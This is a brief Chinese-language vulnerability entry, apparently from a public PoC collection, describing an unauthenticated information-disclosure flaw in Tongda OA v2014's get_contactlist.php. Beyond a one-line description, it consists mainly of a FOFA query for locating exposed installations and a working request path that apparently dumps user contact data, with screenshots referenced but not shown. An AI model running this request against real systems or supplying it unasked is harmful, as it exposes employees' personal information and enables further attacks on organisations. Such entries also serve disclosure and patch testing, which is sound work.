# 通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞

## 漏洞描述

通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击

## 漏洞影响

```
通达OA v2014
```

## FOFA

```
app="TDXK-通达OA"
```

## 漏洞复现

版本信息

![image-20220520154718609](./images/202205201547687.png)

验证POC

```
/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
```

![image-20220520154741599](./images/202205201547656.png)